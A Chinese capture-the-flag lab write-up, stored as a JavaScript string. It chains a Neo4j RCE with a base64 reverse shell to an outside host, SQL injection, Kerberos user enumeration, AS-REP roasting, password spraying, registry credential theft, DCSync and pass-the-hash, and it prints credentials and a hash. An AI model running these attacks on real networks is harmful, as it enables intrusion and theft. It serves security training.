const r="## 知识点\r\n\r\n### [AS\\-REPRoasting](https://c1trus.top/24-active-directory/movement/4-kerberos/as-reproasting.html)\r\n\r\n> 对于域用户，如果设置了选项`Do not require Kerberos preauthentication`(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat或是john对其破解，最终获得该用户的明文口令\r\n> \r\n> \r\n\r\n\r\n\r\n我发现一个妙招。就是有时候在shell上不能删除嘛只能重新输命令我觉得很麻烦今天突然发现按住ctrl就能删除了\r\n\r\n\r\n\r\n## 工具\r\n\r\n还有一些前面用到过的工具，比如minikatz等\r\n\r\n### neo4j的jar包https://github.com/zwjjustdoit/CVE-2021-34371.jar\r\n\r\n是 Neo4j 图数据库管理系统中的一个严重漏洞，影响版本为 **Neo4j 3.4.18 及更早版本**。当启用了 Neo4j Shell 接口时，攻击者可以通过 **RMI 协议** 未授权调用任意方法，其中 *setSessionVariable* 方法存在 **Java 反序列化漏洞**，从而实现远程代码执行（RCE）。\r\n\r\nhttps://github.com/vulhub/vulhub/blob/master/neo4j/CVE-2021-34371/README.zh-cn.md可以参考这个复现\r\n\r\n\r\n\r\n### kerbrutehttps://github.com/ropnop/kerbrute\r\n\r\n[【爆破】Kerbrute](https://c1trus.top/26-tools/%E3%80%90%E7%88%86%E7%A0%B4%E3%80%91kerbrute.html)用于爆破**Kerberos** 协议，域内用户，以及一些密码\r\n\r\n相关知识点可以看这：[kerbeos Enumeration](https://c1trus.top/24-active-directory/movement/4-kerberos/kerbeos-enumeration.html)\r\n\r\n\r\n\r\n### Hashcat\r\n\r\n密码恢复工具，用于爆破\r\n\r\nhttps://blog.csdn.net/2301_79518550/article/details/155232246\r\n\r\n\r\n\r\n### **SharpHound**\r\n\r\n注意：只适合在打靶机的时候用，不推荐实战\r\n\r\n因为它动静会特别大，域控上会到处都是日志\r\n\r\n### **在Windows上安装**\r\n\r\nhttps://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-bloodhound%E5%88%86%E6%9E%90%E5%9F%9F%E7%8E%AF%E5%A2%83/\r\n\r\n1. 安装JDK 11。\r\n\r\n2. 下载并安装Neo4j。\r\n\r\n3. 下载BloodHound并运行。\r\n\r\n\r\n\r\n我直接上github搜https://github.com/SpecterOps/SharpHound/releases/tag/v2.13.0下第三个\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# 正文\r\n\r\n## flag01\r\n\r\n1. 先用fscan扫一下\r\n\r\n```Markdown\r\nD:\\ctf\\web\\渗透>.\\fscan -h 39.100.181.54\r\n\r\n   ___                              _\r\n  / _ \\     ___  ___ _ __ __ _  ___| | __\r\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\r\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\r\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\r\n                     fscan version: 1.8.4\r\nstart infoscan\r\n39.100.181.54:22 open\r\n39.100.181.54:7687 open\r\n[*] alive ports len is: 2\r\nstart vulscan\r\n[*] WebTitle https://39.100.181.54:7687 code:400 len:50     title:None\r\n已完成 2/2\r\n```\r\n\r\n但是这里只会告诉开放了7687的端口，并没有说明漏洞\r\n\r\n但是通过端口可以知道是neo4j，判断是否\r\n\r\n### 存在一个未授权的neo4jRCE\r\n\r\n\r\n\r\n3. 下载好前面工具的那个jar包\r\n\r\n4. 先开一个监听器\r\n\r\n```PHP\r\nnc -lvnp 1111\r\n```\r\n\r\n5. 在攻击端上传好那个架包到/var/www/html/下面（为了方便先构建一个neo4j文件夹然后放在下面）\r\n\r\n```PHP\r\ncd /var/www/html/\r\n\r\nls // 看一下在不在\r\n\r\ncd neo4j/\r\nls // 看见rhino_gadget.jar\r\n```\r\n\r\n命令在工具链接里面也有图片\r\n\r\n6. 找一个反弹shell生成，为了防止特殊字符导致出错，用base64先编码再解码\r\n\r\n注意一下java版本（如果显示 `9+ / 11 / 17 / 21`，就会撞 `IllegalAccessError`。）\r\n\r\n```PHP\r\njava -version // 先确定java版本\r\nwhich -a java\r\n\r\nls /usr/lib/jvm // 找机器上有没有java8\r\n\r\n/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar rhino_gadget.jar rmi://39.100.181.54:1337 \"bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTIwLjQ4LjExMy4yNDIvMTExMSAwPiYx}|{base64,-d}|{bash,-i}\" // 找到了就直接用这个\r\n\r\napt update\r\napt install -y openjdk-8-jre-headless // 如果没有java8就先安装一个\r\n```\r\n\r\n7. 弹上来后在监听端这里不需要提权，直接找flag01\r\n\r\n```PHP\r\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\r\nstty raw -echo\r\n```\r\n\r\nshell 有了，但不是交互式 tty shell体验感有点差所以给他升级一下\r\n\r\n```PHP\r\ncd /home/neo4j/\r\n\r\nls\r\n\r\ncat flag01.txt\r\n```\r\n\r\n得到flag01: flag{2e881666-495a-445e-b8da-ee6a93ef5df4}\r\n\r\n\r\n\r\n## flag02\r\n\r\n### 搭建内网代理\r\n\r\n1. 在监听端先把内网代理的文件下好\r\n\r\n不知道为啥又出事故了，下面这两好用一点（记得开8888端口代理）\r\n\r\n```Bash\r\n# 在 root@instance-lol5bnhw 这台上执行\r\npwd\r\nls /var/www/html\r\ncp /tmp/linux_x64_agent /var/www/html/\r\ncp /tmp/fscan /var/www/html/\r\n```\r\n\r\n```PHP\r\ncd /tmp\r\n\r\nneo4j@ubuntu:/tmp$ wget http://120.48.113.242:8888/linux_x64_agent\r\nchmod +x linux_x64_agent\r\n\r\nneo4j@ubuntu:/tmp$ wget http://120.48.113.242:8888/fscan\r\nchmod +x fscan // 给他一个权限\r\n```\r\n\r\n2. 收集信息\r\n\r\n```PHP\r\n$ ip a // 先看一下网卡信息\r\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\r\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\r\n    inet 127.0.0.1/8 scope host lo\r\n       valid_lft forever preferred_lft forever\r\n    inet6 ::1/128 scope host \r\n       valid_lft forever preferred_lft forever\r\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\r\n    link/ether 00:16:3e:0e:c3:df brd ff:ff:ff:ff:ff:ff\r\n    inet 172.22.6.36/16 brd 172.22.255.255 scope global dynamic eth0\r\n       valid_lft 1892157724sec preferred_lft 1892157724sec\r\n    inet6 fe80::216:3eff:fe0e:c3df/64 scope link \r\n       valid_lft forever preferred_lft forever\r\n\r\n```\r\n\r\n可以看到是一个172\\.22\\.6\\.36\r\n\r\n3. 扫内网网段\r\n\r\n```PHP\r\nneo4j@ubuntu:/tmp$ ./fscan -h 172.22.6.36/24\r\n\r\n   ___                              _    \r\n  / _ \\     ___  ___ _ __ __ _  ___| | __ \r\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\r\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \r\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \r\n                     fscan version: 1.8.4\r\nstart infoscan\r\ntrying RunIcmp2\r\nThe current user permissions unable to send icmp packets\r\nstart ping\r\n(icmp) Target 172.22.6.36     is alive\r\n(icmp) Target 172.22.6.38     is alive\r\n(icmp) Target 172.22.6.25     is alive\r\n(icmp) Target 172.22.6.12     is alive\r\n[*] Icmp alive hosts len is: 4\r\n172.22.6.25:445 open\r\n172.22.6.12:445 open\r\n172.22.6.12:139 open\r\n172.22.6.25:139 open\r\n172.22.6.25:135 open\r\n172.22.6.12:135 open\r\n172.22.6.38:80 open\r\n172.22.6.38:22 open\r\n172.22.6.36:22 open\r\n172.22.6.12:88 open\r\n172.22.6.36:7687 open\r\n[*] alive ports len is: 11\r\nstart vulscan\r\n[*] NetBios 172.22.6.25     XIAORANG\\WIN2019              \r\n[*] NetInfo \r\n[*]172.22.6.12\r\n   [->]DC-PROGAME\r\n   [->]172.22.6.12\r\n[*] NetInfo \r\n[*]172.22.6.25\r\n   [->]WIN2019\r\n   [->]172.22.6.25\r\n[*] WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录\r\n[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393\r\n[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)\r\n[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None\r\n已完成 11/11\r\n```\r\n\r\n扫出来可以看到有四台主机\r\n\r\n```PHP\r\n172.22.6.36    neo4j web入口机              已拿下\r\n172.22.6.38    内网web机  开放80端口   \r\n172.22.6.25    WIN2019.xiaorang.lab        域内主机\r\n172.22.6.12    DC:DC-PROGAME.xiaorang.lab  域控\r\n\r\n前面说过有web就优先打web机\r\n```\r\n\r\n不过并没有爆出什么漏洞，先搭建内网代理吧\r\n\r\n4. 在攻击机上开启stowaway服务端\r\n\r\n```PHP\r\ncd /tmp\r\n \r\n./stowaway_admin -l 2222 // 因为做前几题代理的时候端口都是2222所以就都做2222好记一点\r\n```\r\n\r\n5. 连接\r\n\r\n在监听端那里执行\r\n\r\n```PHP\r\n./linux_x64_agent -c 120.48.113.xxx:2222\r\n```\r\n\r\n6. 切换节点，开代理\r\n\r\n```PHP\r\nuse 0\r\nsocks 3333\r\n```\r\n\r\n7. 打开proxifier连接127.22.6.38\r\n\r\n\r\n\r\n![image.png](/images/time%202.png)\r\n\r\n\r\n1. 打开网站后有一个登录框，这里有一个sql注入\r\n\r\n拿到sqlmap去跑一下\r\n\r\n```PHP\r\n补充，视频是直接随便输入账密然后在hackbar获取数据包，将数据全部复制下来后放在url.txt文件下面\r\n然后在Windows执行命令：python sqlmap.py -r url.txt --dbs\r\npython sqlmap.py -r url.txt -D oa_db -tables\r\npython sqlmap.py -r url.txt -D oa_db -T oa_users --dump \r\n```\r\n\r\n内网直接输入应该是跑不出来的，要开代理\r\n\r\n1. 查库名\r\n\r\n```PHP\r\nproxychains4 sqlmap -u \"http://172.22.6.38/index.php\" --data=\"username=admin&password=*\" --dbs\r\n\r\navailable databases [5]:\r\n[*] information_schema\r\n[*] mysql\r\n[*] oa_db\r\n[*] performance_schema\r\n[*] sys\r\n```\r\n\r\n2. 查表名\r\n\r\n```PHP\r\nproxychains4 sqlmap -u \"http://172.22.6.38/index.php\" --data=\"username=admin&password=*\" -D oa_db --tables\r\n\r\nDatabase: oa_db\r\n[3 tables]\r\n+------------+\r\n| oa_admin   |\r\n| oa_f1Agggg |\r\n| oa_users   |\r\n+------------+\r\n```\r\n\r\n3. 查数据\r\n\r\n```PHP\r\nproxychains4 sqlmap -u \"http://172.22.6.38/index.php\" --data=\"username=admin&password=*\" -D oa_db -T oa_f1Agggg --dump\r\n\r\nDatabase: oa_db\r\nTable: oa_f1Agggg\r\n[1 entry]\r\n+----+--------------------------------------------+\r\n| id | flag02                                     |\r\n+----+--------------------------------------------+\r\n| 1  | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |\r\n+----+--------------------------------------------+\r\n```\r\n\r\n\r\n\r\n当然也有一步到位的方法，但是其他列也有自己的用途所以还是一步一步来吧\r\n\r\n```PHP\r\nproxychains4 sqlmap -u http://172.22.6.38/index.php -data \"username=admin&password=*\" --dump\r\n```\r\n\r\n\r\n得到flag02：flag{b142f5ce-d9b8-4b73-9012-ad75175ba029}\r\n\r\n\r\n\r\n## flag03\r\n\r\n这里用一下其他列，admin管理员\r\n\r\n```PHP\r\nproxychains4 sqlmap -u \"http://172.22.6.38/index.php\" --data=\"username=admin&password=*\" -D oa_db -T oa_admin --dump\r\n\r\nDatabase: oa_db\r\nTable: oa_admin\r\n[1 entry]\r\n+----+------------------+---------------+\r\n| id | password         | username      |\r\n+----+------------------+---------------+\r\n| 1  | bo2y8kAL3HnXUiQo | administrator |\r\n+----+------------------+---------------+\r\n```\r\n\r\n这个好像也没有什么大用。oa_users列里面有500个用户的邮箱\r\n可以发现这些邮箱都是以域名结尾的那么很有可能这前面的就是域用户，把这个信息提取出来username.txt\r\n\r\n\r\n\r\n### 利用kerbrute域用户枚举\r\n\r\n来枚举出有效的域内用户，这里就需要用到前面提取出来的信息字典。\r\n\r\n用入口机也就是搭建好内网代理的那台来操作\r\n\r\n```PHP\r\nshell\r\n```\r\n\r\n先将kerbrute和字典上传到服务器上（/var/www/html），再传到入口机上去\r\n\r\n```PHP\r\ncd /tmp // 注意啊我切换这个目录不是说这两个东西放在这，而是因为/tmp有权限 可以 将这两个东西下载到这\r\nwget 120.48.113.xxx/kerbrute\r\n\r\nwget 120.48.113.xxx/username.txt\r\n\r\nls\r\n\r\nchmod +x kerbrute // 老样子先给个权限\r\n```\r\n\r\n开始爆破（kerbrute的常见用法工具那里讲了一点）\r\n\r\n```PHP\r\n./kerbrute userenum --dc 172.22.2.12 -d xiaorang.lab username.txt -o valid_users.txt\r\n```\r\n\r\n```PHP\r\nneo4j@ubuntu:/tmp$ ./kerbrute userenum --dc 172.22.6.12 -d xiaorang.lab username.txt -t 10\r\n```\r\n\r\n然后就找到了在这个域里面的74个有效的域内用户\r\n\r\n提取成字典（按住艾特健alt就可以把用户全框住）放在新建文件valid_users.txt里面\r\n\r\n\r\n\r\n### AS-REP Roasting（相关原理见知识点）\r\n\r\n先将valid_users.txt传到kali里面，从有效的域用户里面找一下没有开启域身份验证的用户\r\n\r\n（工具在impacket套件里面）\r\n\r\n方法有很多这里用的GetNPUsers.py这个\r\n\r\n```PHP\r\nproxychains -q impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile valid_users.txt xiaorang.lab/\r\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \r\n\r\n[-] User chengqiu@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User wenbiao@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User chuyuan@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User louyou@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User luyue@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User weishengshan@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User maqun@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User wenliang@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User yulvxue@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User guohong@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User pangzhen@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User ganjian@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User lezhong@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User lidongjin@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User dujian@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User qiaomei@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User sheweiyue@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User maoda@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User yexing@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n[-] User hongqun@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:d267db2bd52c56c9fc4cd9cc78d87105$\r\n[-] User ganjian@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r\n```\r\n\r\n检测完后发现有两个\r\n\r\n1. 如果没有开启域身份认证的话，可以获取到krb5asrep的哈希\r\n\r\n通过哈希可以爆破出他的密码，将哈希复制下来保存在hash\\.txt后用hashcat爆破就行了\r\n\r\n```PHP\r\nD:\\ctf\\web\\hashcat-7.1.2>hashcat.exe hash.txt rockyou.txt\r\n```\r\n\r\n然后爆破出来得到他的密码是hellokitty，用户名就是哈希头wenshao@xiaorong\\.rab\r\n\r\n2. 同理，\r\n\r\n```YAML\r\nD:\\ctf\\web\\hashcat-7.1.2>hashcat.exe -m 18200 hash.txt example.dict\r\nhashcat (v7.1.2) starting\r\n\r\nSuccessfully initialized the NVIDIA main driver CUDA runtime library.\r\n\r\nFailed to initialize NVIDIA RTC library.\r\n\r\n* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.\r\n             CUDA SDK Toolkit required for proper device support and utilization.\r\n             For more information, see: https://hashcat.net/faq/wrongdriver\r\n             Falling back to OpenCL runtime.\r\n\r\nIf you are using WSL2 you can use CUDA instead of OpenCL.\r\nUsers must not install any NVIDIA GPU Linux driver within WSL 2\r\nFor all details: https://docs.nvidia.com/cuda/wsl-user-guide/index.html\r\n\r\nTLDR; go to https://developer.nvidia.com/cuda-downloads and follow this path:\r\n  Linux -> Architecture -> Distribution -> Version -> deb (local)\r\nFollow the installation Instructions on the website.\r\n\r\nnvmlDeviceGetFanSpeed(): Not Supported\r\n\r\nOpenCL API (OpenCL 3.0 CUDA 13.0.97) - Platform #1 [NVIDIA Corporation]\r\n=======================================================================\r\n* Device #01: NVIDIA GeForce RTX 5060 Laptop GPU, 8150/8150 MB (2037 MB allocatable), 26MCU\r\n\r\nOpenCL API (OpenCL 3.0 ) - Platform #2 [Intel(R) Corporation]\r\n=============================================================\r\n* Device #02: Intel(R) RaptorLake-S Mobile Graphics Controller, 3560/7120 MB (1780 MB allocatable), 8MCU\r\n\r\nMinimum password length supported by kernel: 0\r\nMaximum password length supported by kernel: 256\r\nMinimum salt length supported by kernel: 0\r\nMaximum salt length supported by kernel: 256\r\n\r\nHashes: 1 digests; 1 unique digests, 1 unique salts\r\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\r\nRules: 1\r\n\r\nOptimizers applied:\r\n* Zero-Byte\r\n* Not-Iterated\r\n* Single-Hash\r\n* Single-Salt\r\n\r\nATTENTION! Pure (unoptimized) backend kernels selected.\r\nPure kernels can crack longer passwords, but drastically reduce performance.\r\nIf you want to switch to optimized kernels, append -O to your commandline.\r\nSee the above message to find out about the exact limits.\r\n\r\nWatchdog: Temperature abort trigger set to 90c\r\n\r\nHost memory allocated for this attack: 810 MB (1949 MB free)\r\n\r\nDictionary cache built:\r\n* Filename..: example.dict\r\n* Passwords.: 128416\r\n* Bytes.....: 1069601\r\n* Keyspace..: 128416\r\n* Runtime...: 0 secs\r\n\r\nThe wordlist or mask that you are using is too small.\r\nThis means that hashcat cannot use the full parallel power of your device(s).\r\nHashcat is expecting at least 868096 base words but only got 14.8% of that.\r\nUnless you supply more work, your cracking speed will drop.\r\nFor tips on supplying more work, see: https://hashcat.net/faq/morework\r\n\r\nApproaching final keyspace - workload adjusted.\r\n\r\n$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:d267db2bd52c56c9fc4cd9cc78d87105$:strawberry\r\n\r\nSession..........: hashcat\r\nStatus...........: Cracked\r\nHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)\r\nHash.Target......: $krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:d2...6ddf4d\r\nTime.Started.....: Fri Jul 24 12:43:08 2026 (0 secs)\r\nTime.Estimated...: Fri Jul 24 12:43:08 2026 (0 secs)\r\nKernel.Feature...: Pure Kernel (password length 0-256 bytes)\r\nGuess.Base.......: File (example.dict)\r\nGuess.Queue......: 1/1 (100.00%)\r\nSpeed.#01........: 61318.1 kH/s (0.61ms) @ Accel:1024 Loops:1 Thr:32 Vec:1\r\nSpeed.#02........:        0 H/s (6.29ms) @ Accel:63 Loops:1 Thr:32 Vec:1\r\nSpeed.#*.........: 61318.1 kH/s\r\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\r\nProgress.........: 98201/128416 (76.47%)\r\nRejected.........: 0/98201 (0.00%)\r\nRestore.Point....: 0/128416 (0.00%)\r\nRestore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1\r\nRestore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:0-1\r\nCandidate.Engine.: Device Generator\r\nCandidates.#01...: 3298201588 -> suche09\r\nCandidates.#02...: 0 -> 329586r\r\nHardware.Mon.#01.: Temp: 42c Util:  0% Core:1605MHz Mem:9001MHz Bus:8\r\nHardware.Mon.#02.: N/A\r\n\r\nStarted: Fri Jul 24 12:43:04 2026\r\nStopped: Fri Jul 24 12:43:09 2026\r\n```\r\n\r\n3. 总结得到账密\r\n\r\n```PHP\r\nzhangxin@xiaorang.lab strawberry\r\nwenshao@xiaorang.lab  hellokitty\r\n```\r\n\r\n但是这个账密不一定有权限与域内进行交互，所以需要进行\r\n\r\n\r\n\r\n### 密码喷涂\r\n\r\n看看能不能rdp上去\r\n\r\n这里进行密码喷涂的时候前面得到的账密不要加上域名，因为这里用的 [nxc](https://c1trus.top/.html) 进行密码喷涂（Tsclient也是用的nxc，用[crackmapexec](https://c1trus.top/26-tools/cme-crackmapexec%E4%BD%BF%E7%94%A8.html)会报错）nxc会自动获取域名，加上域名的话就重复了导致爆不出来\r\n\r\n然后把这两个的账密按照顺序分别写进domain_user.txt和domain_pass.txt\r\n\r\n```PHP\r\nproxychains -q nxc rdp 172.22.6.0/24 -u domain.txt -p domain_pass.txt --no-bruteforce\r\n```\r\n\r\n```PHP\r\n└─$ proxychains -q nxc rdp 172.22.6.0/24 -u domain.txt -p domain_pass.txt --no-bruteforce\r\nRDP         172.22.6.25     3389   WIN2019          [*] Windows 10 or Windows Server 2016 Build 17763 (name:WIN2019) (domain:xiaorang.lab) (nla:True)\r\nRDP         172.22.6.12     3389   DC-PROGAME       [*] Windows 10 or Windows Server 2016 Build 14393 (name:DC-PROGAME) (domain:xiaorang.lab) (nla:True)\r\n```\r\n\r\n因为顺序是一一对应的嘛，可以发现wenshao这个用户可以登录到\\.25也就是WIN2019这台机器\r\n\r\n\r\n\r\n### rdp登录（桌面远程连接）\r\n\r\n连接好后上传bloodhound域信息对域环境进行分析\r\n\r\n上传SharpHound进行数据采集，（BruteRoad的时候安过）\r\n\r\n```PHP\r\ncd .\\desktop\\\r\n.\\SharpHound.exe -c all\r\n```\r\n\r\n执行完成后会有个压缩包，将压缩包导入到kali的bloodhound里面\r\n\r\n```PHP\r\nsudo bloodhound-start\r\n```\r\n\r\n导入成功后一般先看到域控的最短路径Shortest paths to Domain Admins\r\n\r\n![image.png](/images/time%201.png)\r\n\r\n可以看到这个机器到yuxuan有个HasSession，即这个机器上保存有yuxuan的密码。那么可以利用注册表\r\n\r\n然后yuxuan又HasSIDhistory到域管ADMIN，也就是说它包含有域管的SID，那么他就和域管有相同的权力，即可以通过dcsync导出域管的哈希进行pth进而拿下整个域\r\n\r\n\r\n\r\n### 获取yuxuan密码（HasSession）\r\n\r\n用powershell查看注册表\r\n\r\n```PHP\r\nPS C:\\Users\\wenshao\\desktop> reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\r\n\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\r\n    AutoRestartShell    REG_DWORD    0x1\r\n    Background    REG_SZ    0 0 0\r\n    CachedLogonsCount    REG_SZ    10\r\n    DebugServerCommand    REG_SZ    no\r\n    DisableBackButton    REG_DWORD    0x1\r\n    EnableSIHostIntegration    REG_DWORD    0x1\r\n    ForceUnlockLogon    REG_DWORD    0x0\r\n    LegalNoticeCaption    REG_SZ\r\n    LegalNoticeText    REG_SZ\r\n    PasswordExpiryWarning    REG_DWORD    0x5\r\n    PowerdownAfterShutdown    REG_SZ    0\r\n    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}\r\n    ReportBootOk    REG_SZ    1\r\n    Shell    REG_SZ    explorer.exe\r\n    ShellCritical    REG_DWORD    0x0\r\n    ShellInfrastructure    REG_SZ    sihost.exe\r\n    SiHostCritical    REG_DWORD    0x0\r\n    SiHostReadyTimeOut    REG_DWORD    0x0\r\n    SiHostRestartCountLimit    REG_DWORD    0x0\r\n    SiHostRestartTimeGap    REG_DWORD    0x0\r\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,\r\n    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile\r\n    WinStationsDisabled    REG_SZ    0\r\n    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe\r\n    scremoveoption    REG_SZ    0\r\n    DisableCAD    REG_DWORD    0x1\r\n    LastLogOffEndTimePerfCounter    REG_QWORD    0xedd7ccd15\r\n    ShutdownFlags    REG_DWORD    0x80000027\r\n    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180\r\n    LastUsedUsername    REG_SZ    yuxuan\r\n    AutoAdminLogon    REG_SZ    1\r\n    DefaultUserName    REG_SZ    yuxuan\r\n    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L\r\n    DefaultDomainName    REG_SZ    xiaorang.lab\r\n```\r\n\r\n可以抓取到yuxuan用户保存的密码\r\n\r\n\r\n\r\n尝试用yuxuan的用户登录这台主机\r\n\r\n\r\n\r\n### dcsync攻击\r\n\r\n先上传一个猕猴桃并打开\r\n\r\n```PHP\r\nlog 1.txt // 开启日志\r\nlsadump::dcsync /domain:xiaorang.lab /user:administrator #导出域管的hash\r\n```\r\n\r\n完成后将日志复制到本地，\r\n\r\n![image.png](/images/time%204.png)\r\n\r\n\r\n\r\n### pth横向移动\r\n\r\n利用wmi\r\n\r\n```PHP\r\nproxychains impacket-wmiexec  xiaorang/administrator@172.22.6.25   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -codec gbk\r\n```\r\n\r\n先到.25这台WIN2019这台主机获取flag03\r\n\r\n```PHP\r\ncd users\\administrator\r\ndir\r\ncd flag\r\ndir\r\ntype flag03.txt\r\n```\r\n\r\n得到flag03: flag{f1095f01-e45f-4282-ab1b-24fd21ba91d4}\r\n\r\n\r\n\r\n## flag04\r\n\r\n然后再pth到域管的那台主机上\r\n\r\n```PHP\r\nproxychains impacket-wmiexec  XIAORANG/administrator@172.22.6.12   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -codec gbk\r\n```\r\n\r\n然后拿flag\r\n\r\n```PHP\r\ntype C:\\Users\\Administrator\\flag\\flag*\r\n```\r\n\r\n得到flag04: flag{04b58407-ebec-4680-8797-b3a399513e04}";export{r as default};
